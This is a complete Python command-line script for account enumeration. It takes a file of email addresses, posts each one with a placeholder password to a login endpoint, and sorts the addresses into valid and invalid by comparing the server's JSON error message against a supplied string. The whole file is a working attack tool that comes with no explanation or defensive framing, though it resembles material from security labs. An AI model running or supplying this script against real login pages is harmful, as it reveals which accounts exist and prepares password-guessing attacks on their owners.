import requests
import sys
from urllib.parse import urlparse

def check_email(email , url):
    # Parse the URL into its components (e.g., scheme, netloc, path)
    try:
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            raise ValueError("Invalid URL format")
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

    netloc=parsed_url.netloc
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"               # Construct the origin by combining the scheme (e.g., http or https) and netloc (domain name)
    
    headers = {
        'Host': netloc,
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': origin ,
        'Connection': 'close',
        'Referer': url,
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()  # Check for HTTP errors

        # Check if the response content type is JSON
        if 'application/json' in response.headers.get('Content-Type', ''):
            try:
                return response.json()
            except ValueError:
                print(f"Error: Invalid JSON response from server. Response content: {response.text}")
                return None
        else:
            print(f"Error: Unexpected content type: {response.headers.get('Content-Type')}")
            print(f"Raw response: {response.text}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"HTTP Request Error: {e}")
        return None

def enumerate_emails(email_file, url, invalid_error):
    valid_emails = []

    try:
        with open(email_file, 'r') as file:
            emails = file.readlines()
    except FileNotFoundError:
        print(f"Error: File '{email_file}' not found.")
        sys.exit(1)

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email, url)
            # Check if response_json isn't None before accessing it
            if response_json is not None:
                if response_json.get('status') == 'error' and invalid_error in response_json.get('message', ''):
                    print(f"[INVALID] {email}")
                else:
                    print(f"[VALID] {email}")
                    valid_emails.append(email)
            else:
                print(f"[ERROR] No valid response received for {email}")

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 script.py <email_list_file> <url> <invalid_error>")
        sys.exit(1)

    email_file = sys.argv[1]
    url=sys.argv[2]
    invalid_error=sys.argv[3]
    
    valid_emails = enumerate_emails(email_file , url, invalid_error)
    
    # Print results if valid emails were found
    if valid_emails:
        print("\nValid emails found:")
        for valid_email in valid_emails:
            print(valid_email)
    else:
        print("\nNo valid emails found.")
        